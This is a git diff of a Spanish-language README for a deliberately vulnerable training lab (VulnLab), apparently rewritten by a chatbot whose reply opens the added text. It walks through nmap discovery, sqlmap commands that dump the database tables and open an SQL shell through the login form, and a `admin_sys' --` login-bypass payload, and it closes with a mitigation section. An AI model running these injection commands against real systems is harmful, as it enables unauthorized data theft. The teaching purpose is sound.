@@ -1,112 +1,156 @@
+¡Excelente iniciativa! He actualizado tu manual para que refleje exactamente los cambios que implementamos en el laboratorio: el nuevo esquema `pentest_lab`, el usuario real `admin_sys` y los parámetros de red que te funcionaron mejor (como el `--delay` para evitar bloqueos).
+
+Aquí tienes el **README.md** listo para copiar y usar en tu repositorio:
+
+---
+
 # Laboratorio de Pentesting: De la Red a la Base de Datos
 
-Este manual detalla el proceso completo para preparar, descubrir, escanear y explotar la vulnerabilidad de SQL Injection en VulnLab.
+Este manual detalla el proceso completo para preparar, descubrir, escanear y explotar la vulnerabilidad de SQL Injection en **VulnLab**.
 
 ## 0. Configuración del Entorno (ParrotOS / Kali)
+
 Antes de comenzar, instala las herramientas necesarias y descarga el laboratorio.
 
 **1. Instalar y Actualizar Herramientas:**
+
 ```bash
 sudo apt update
 sudo apt install git docker.io docker-compose nmap sqlmap -y
 # Iniciar el servicio de Docker
 sudo systemctl start docker
 sudo systemctl enable docker
+
 ```
 
 **2. Clonar el Repositorio:**
+
 ```bash
 git clone https://github.com/williamstevencole/VulnLab.git
-cd PENTESTING
+cd VulnLab
+
 ```
 
 ---
 
 ## 1. Escenario
-Estás ante una red social moderna llamada **VulnLab**. 
+
+Estás ante una red social moderna llamada **VulnLab**. El objetivo es demostrar cómo una mala implementación en el backend permite el acceso total a la información.
 
 **Iniciar el Laboratorio:**
+
 ```bash
 cd vulnerable
-docker-compose up --build
+docker-compose up -d --build
+
 ```
-- **Frontend:** React (Puerto 5173) -> `http://localhost:5173`
-- **Backend:** Node.js (Puerto 3000) -> `http://localhost:3000`
+
+* **Frontend:** React (Puerto 8000) -> `http://localhost:8000`
+* **Backend (API):** Node.js (Puerto 8080) -> `http://localhost:8080`
 
 ---
 
 ## 2. Descubrimiento de Red (Host Discovery)
+
 Identifica qué máquinas están activas en tu red local para encontrar el servidor.
 
-**Comando para listar todas las IPs conectadas:**
+**Comando para listar IPs activas:**
+
 ```bash
-# Sustituye 192.168.1.0/24 por tu rango de red actual
-sudo nmap -sn 192.168.1.0/24
+# Sustituye por tu rango de red (ej. 192.168.88.0/24 o 10.40.118.0/24)
+sudo nmap -sn 192.168.88.0/24
+
 ```
-*Este comando realiza un "Ping Scan" para ver quién responde sin escanear puertos todavía.*
 
 ---
 
 ## 3. Escaneo de Puertos (Port Scanning)
-Una vez identificada una IP sospechosa, verificamos los puertos abiertos rápidamente.
 
-**Comando para ver puertos abiertos de forma rápida:**
+Verificamos qué servicios están escuchando en la IP sospechosa detectada.
+
+**Escaneo rápido de puertos específicos:**
+
 ```bash
-nmap -p 3000-6000 <IP_OBJETIVO> --open
+nmap -p 8080,8000 <IP_OBJETIVO> --open
+
 ```
-*Buscamos los puertos **3000** (API) y **5173** (Frontend).*
 
 ---
 
 ## 4. Enumeración de Servicios y Vulnerabilidades
-Analizamos las versiones de los servicios para identificar posibles puntos de entrada.
 
-**Comando para detectar versiones y vulnerabilidades:**
+Analizamos el backend para confirmar la tecnología utilizada (Express/PostgreSQL).
+
+**Comando de detección:**
+
 ```bash
-nmap -sV -sC -p 3000 <IP_OBJETIVO>
+nmap -sV -sC -p 8080 <IP_OBJETIVO>
+
 ```
-*   `-sV`: Detecta la versión del servicio (ej. Node.js Express).
-*   `-sC`: Ejecuta scripts por defecto para detectar fallos comunes.
 
 ---
 
 ## 5. Explotación de Base de Datos (SQLMap)
-Al confirmar que el puerto 3000 tiene un servicio web, procedemos a explotar el formulario de login.
 
-**Paso A: Listar todas las bases de datos**
+El formulario de login en el puerto 8080 no sanitiza las entradas, lo que permite inyectar comandos SQL.
+
+**Paso A: Listar todos los esquemas (databases)**
+Utilizamos `--delay 1` para no saturar el servidor y `--ignore-code 500` porque el backend falla al recibir caracteres especiales.
+
 ```bash
-sqlmap -u "http://<IP_OBJETIVO>:3000/login" --data '{"username":"admin","password":"123"}' --method POST --batch --dbs
+sqlmap -u "http://<IP_OBJETIVO>:8080/login" \
+  --data '{"username":"admin_sys","password":"123"}' \
+  --method POST --header "Content-Type: application/json" \
+  -p username --dbms postgres --delay 1 --batch --dbs
+
 ```
 
-**Paso B: Listar las tablas de la base de datos `pentest_db`**
+**Paso B: Listar las tablas del esquema `pentest_lab**`
+
 ```bash
-sqlmap -u "http://<IP_OBJETIVO>:3000/login" --data '{"username":"admin","password":"123"}' --method POST --batch -D pentest_db --tables
+sqlmap -u "http://<IP_OBJETIVO>:8080/login" \
+  --data '{"username":"admin_sys","password":"123"}' \
+  --method POST --header "Content-Type: application/json" \
+  -p username --dbms postgres -D pentest_lab --tables --batch
+
 ```
 
-**Paso C: Exfiltrar contenido de una tabla específica (ej. `users`)**
+**Paso C: Exfiltrar la tabla de usuarios (`users`)**
+
 ```bash
-sqlmap -u "http://<IP_OBJETIVO>:3000/login" --data '{"username":"admin","password":"123"}' --method POST --batch -D pentest_db -T users --dump
+sqlmap -u "http://<IP_OBJETIVO>:8080/login" \
+  --data '{"username":"admin_sys","password":"123"}' \
+  --method POST --header "Content-Type: application/json" \
+  -p username --dbms postgres -D pentest_lab -T users --dump --batch
+
 ```
 
-**Paso D: Obtener una Shell interactiva de SQL**
+**Paso D: Obtener una SQL Shell interactiva**
+
 ```bash
-sqlmap -u "http://<IP_OBJETIVO>:3000/login" --data '{"username":"admin","password":"123"}' --method POST --batch --sql-shell
+sqlmap -u "http://<IP_OBJETIVO>:8080/login" \
+  --data '{"username":"admin_sys","password":"123"}' \
+  --method POST --header "Content-Type: application/json" \
+  -p username --dbms postgres --sql-shell
+
 ```
 
 ---
 
-## 6. El Desafío Final
-1. Identifica la IP del instructor mediante el escaneo de red.
-2. Encuentra la contraseña de `admin_sys` usando `sqlmap`.
-3. ¿Puedes encontrar el post de `elon_m` y leer su contenido directamente desde la base de datos?
-4. **Extra:** Intenta entrar al sistema usando el bypass manual `admin_sys' --` en el navegador.
+## 6. El Desafío Final (Capture The Flag)
+
+1. **Identificación:** Encuentra la IP del instructor mediante `nmap`.
+2. **Exfiltración:** Extrae la tabla de usuarios y encuentra la contraseña de `admin_sys`.
+3. **Investigación:** ¿Cuál es el contenido del post de `elon_m`? (Usa la `sql-shell` o el flag `-T posts --dump`).
+4. **Bypass:** Intenta entrar al sitio web sin usar `sqlmap`, ingresando `admin_sys' --` en el campo de usuario del navegador.
 
 ---
 
-## 7. Comparación de Seguridad (Material de Referencia)
-El instructor mostrará un código "Hardened" (Reforzado) que utiliza:
-- **Prisma ORM** (Prevención de SQLi)
-- **Bcrypt** (Hashing de contraseñas)
-- **JWT (JSON Web Tokens)** (Sesiones seguras)
-- **Zod** (Validación de esquemas)
-- **Helmet** (Cabeceras de seguridad)
+## 7. Comparación de Seguridad (Mitigación)
+
+El código vulnerable concatena strings directamente. La solución implementada en la carpeta `secure/` utiliza:
+
+* **Consultas Parametrizadas:** (Uso de `$1`, `$2` en lugar de variables directas).
+* **Esquemas Seguros:** Separación lógica de datos en PostgreSQL.
+* **Hashing:** Las contraseñas en el entorno seguro no son legibles (Bcrypt).
+
